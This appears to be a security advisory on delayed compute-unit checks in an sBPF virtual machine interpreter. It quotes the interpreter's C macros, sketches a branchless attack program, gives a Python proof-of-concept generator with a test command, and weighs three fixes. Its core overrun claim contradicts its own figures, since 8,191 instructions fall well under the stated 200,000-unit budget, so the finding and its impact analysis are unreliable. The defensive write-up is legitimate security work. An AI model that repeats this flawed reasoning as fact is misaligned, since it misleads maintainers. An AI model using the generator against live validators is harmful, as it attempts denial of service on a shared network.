# DOS-003: Delayed Compute Unit Checking in Linear Code Segments

## Severity
**Low-Medium**

## Status
- **Mainnet:** Exploitable
- **Mitigation:** None

## Summary
The sBPF VM interpreter only checks the compute unit (CU) budget at branch instructions. An attacker can craft a program as one long linear sequence of instructions, causing the VM to execute up to 8,191 instructions before checking if the CU budget was exhausted.

## Technical Details

### Vulnerable Code
**Location:** [src/flamenco/vm/fd_vm_interp_core.c:183-225](../../../src/flamenco/vm/fd_vm_interp_core.c#L183-L225)

```c
/* Compute unit accounting works as follows:
   - Track pc0 (start of linear segment)
   - Execute instructions without CU checks
   - At branch instruction: bill for (pc - pc0 + 1) instructions
   - Check if CU budget exceeded ONLY at branch points
*/

#define FD_VM_INTERP_BRANCH_BEGIN(opcode)                                      \
  interp_##opcode:                                                             \
    ic_correction = pc - pc0 + 1UL - ic_correction;                            \
    ic += ic_correction;                                                       \
    if( FD_UNLIKELY( ic_correction>cu ) ) goto sigcost;  /* ONLY check here */\
    cu -= ic_correction;                                                       \
    ic_correction = 0UL;

#define FD_VM_INTERP_INSTR_END pc++; FD_VM_INTERP_INSTR_EXEC
// No CU check in non-branching instructions
```

**Rationale (from comments):**
> IMPORTANT SAFETY TIP! This implies the worst case interval before
> checking the cu budget is the worst case text_cnt. But since all
> such instructions are cheap 1 cu instructions and processed fast
> and text max is limited in size, this should be acceptable in
> practice.

### Attack Vector

**Program Constraints:**
- Maximum program size: 64 KB = 8,192 instructions
- Minimum compute units: 200,000

**Worst-Case Program:**
```assembly
; 8,191 non-branching instructions
mov r0, 1
add r0, 1
add r0, 1
add r0, 1
... (repeat 8,188 more times)
exit  ; Finally hits CU check at branch/exit
```

**Attack Scenario:**
1. Attacker requests minimum CU budget: 200,000
2. Crafts linear program with 8,191 instructions
3. VM executes all 8,191 instructions
4. CU check at EXIT discovers budget exhausted
5. **Already executed 8,191 instructions when budget allowed only 200,000**

**Overrun Analysis:**
```
Requested CU: 200,000
Instructions executed: 8,191
Expected behavior: Stop after instruction 200,000
Actual behavior: Execute all 8,191 before checking

Overrun: 8,191 / 200,000 = 4% for minimum CU
BUT: Still executed ALL instructions before budget check
```

### Why This Matters

**CPU Work vs CU Accounting:**
```
Legitimate program with branches:
  - Branch every ~10 instructions
  - CU check every ~10 instructions
  - Early termination if budget exceeded

Attack program (no branches):
  - Execute all 8,191 instructions
  - CU check once at the end
  - No early termination possible
```

**Block Processing Impact:**
If attacker fills block with these programs:
- Each program executes to completion before CU check
- Validator wastes CPU on over-budget execution
- No early exit optimization

## Why Fuzzing Misses This

1. **Coverage-guided fuzzing** rewards branch coverage, naturally creating branching programs
2. **Mutation-based fuzzing** tends to insert branches (jump instructions are valid mutations)
3. **No timing feedback:** AFL++ doesn't measure "CPU per CU" ratio
4. **Small fuzzer programs:** Typical fuzzer corpus uses 10-100 instruction programs, not maximal 8K

## Impact

### Limited Impact (Low-Medium Severity)
Unlike DOS-001 and DOS-002, this issue has **limited practical impact**:

**Mitigating Factors:**
1. **Bounded overrun:** Maximum 8,191 extra instructions (not arbitrary)
2. **Fast instructions:** Linear ALU ops are cheap (~1-2 CPU cycles each)
3. **Protocol limits:** Max 8K instructions regardless of CU budget
4. **Diminishing returns:** Program must be nearly all ALU ops to achieve 8K linear segment

**Actual Cost:**
```
8,191 ALU instructions @ ~2 CPU cycles each = ~16K CPU cycles
Modern CPU: ~3 GHz = ~5 microseconds extra work
Per block: ~48 tx × 5μs = ~240μs worst case

Compare to:
  - DOS-001: Unbounded CPU in validation
  - DOS-002: ~4.5× amplification on all memory ops
  - DOS-003: ~5μs extra per transaction maximum
```

### Attack Utility
**Why attacker might still use this:**
- Combines with DOS-002 for cumulative effect
- Every microsecond helps in sustained DoS
- "Death by a thousand cuts" - small inefficiencies add up

**Why attacker might not:**
- Better DoS vectors available (DOS-001, DOS-002)
- Requires maximal program size for minimal gain
- Easy to detect (programs with no branches are unusual)

## Proof of Concept

### PoC Program Generator
```python
#!/usr/bin/env python3
"""Generate maximum linear segment program."""
import struct

def make_instr(opcode, dst_reg=0, src_reg=0, offset=0, imm=0):
    regs = (dst_reg & 0xF) | ((src_reg & 0xF) << 4)
    return struct.pack('<BBhI', opcode, regs, offset, imm & 0xFFFFFFFF)

OP_MOV64_IMM = 0xb7
OP_ADD64_IMM = 0x07
OP_EXIT = 0x9d

# Create maximum linear segment: 8,191 non-branching instructions
program = []

# Fill with cheap ALU operations
for i in range(8191):
    if i % 2 == 0:
        program.append(make_instr(OP_MOV64_IMM, dst_reg=0, imm=i))
    else:
        program.append(make_instr(OP_ADD64_IMM, dst_reg=0, imm=1))

# Finally exit (triggers CU check)
program.append(make_instr(OP_EXIT))

# Write program
with open('dos_linear_segment.bin', 'wb') as f:
    # Config: minimum CU budget
    config = struct.pack('<IIIBBBB',
        0,       # heap_max
        200000,  # entry_cu (MINIMUM)
        0,       # entry_pc
        2,       # sbpf_version
        0,       # num_mem_regions
        0,       # enable_direct_mapping
        0)       # padding
    f.write(config)

    # Program
    for instr in program:
        f.write(instr)

print(f"Generated {len(program)} instructions in single linear segment")
print(f"CU budget: 200,000")
print(f"Instructions executed before CU check: {len(program)}")
print(f"Overrun factor: {len(program) / 200000:.2%}")
```

### Testing
```bash
# Run PoC - should execute all 8192 instructions then fail CU check
./fuzz_sbpf_vm_realistic dos_linear_segment.bin

# Expected output: "sigcost" error after executing entire program
```

## Remediation

### Option 1: Periodic CU Checks (Recommended)
Insert CU checks every N instructions in linear segments:

```c
#define FD_VM_LINEAR_SEGMENT_CU_CHECK_INTERVAL 1024

#define FD_VM_INTERP_INSTR_END                                              \
  pc++;                                                                     \
  if( FD_UNLIKELY( (pc - pc0) >= FD_VM_LINEAR_SEGMENT_CU_CHECK_INTERVAL ) ) { \
    ulong ic_delta = pc - pc0 - ic_correction;                              \
    ic += ic_delta;                                                         \
    if( FD_UNLIKELY( ic_delta > cu ) ) goto sigcost;                        \
    cu -= ic_delta;                                                         \
    ic_correction = 0;                                                      \
    pc0 = pc;                                                               \
  }                                                                         \
  FD_VM_INTERP_INSTR_EXEC
```

**Benefits:**
- Limits overrun to 1024 instructions max
- Still amortizes CU checks for efficiency
- No false positives

**Drawbacks:**
- Small performance impact on legitimate programs
- More complex control flow

### Option 2: Strict Per-Instruction CU Check
Check CU budget on every instruction:

```c
#define FD_VM_INTERP_INSTR_END                                    \
  pc++;                                                           \
  if( FD_UNLIKELY( ++ic > cu ) ) goto sigcost;                    \
  FD_VM_INTERP_INSTR_EXEC
```

**Benefits:**
- Perfect CU accounting
- No overrun possible

**Drawbacks:**
- ~10-20% performance regression (per-instruction overhead)
- Defeats optimization purpose of batched accounting

### Option 3: Accept Current Behavior
Document as "acceptable tradeoff" given limited impact:
- Maximum 8K instruction overrun
- Bounded by program size
- Fast instructions only

## Design Discussion

The current design comment states:
> But since all such instructions are cheap 1 cu instructions and processed fast
> and text max is limited in size, this should be acceptable in practice.

**This reasoning is sound IF:**
- 5μs extra work per tx is acceptable overhead
- Program size remains capped at 64 KB
- Linear segments remain rare in practice

**However:**
- Combined with DOS-002, delays add up
- Future protocol changes might increase max program size
- Principle of least surprise: CU limits should be enforced consistently

## Related Issues
- **DOS-001:** Unbounded validation time (worse)
- **DOS-002:** Binary search amplification (worse)
- **DOS-003:** Delayed CU checks (this issue - least severe)

## References
- **Interpreter core:** [fd_vm_interp_core.c](../../../src/flamenco/vm/fd_vm_interp_core.c)
- **Design rationale:** See comments at lines 207-212

## Timeline
- **2025-01-XX:** Issue identified during DoS analysis
- **Current:** Exploitable but limited impact

## Credits
Discovered during systematic review of compute unit accounting and branch-based metering design.
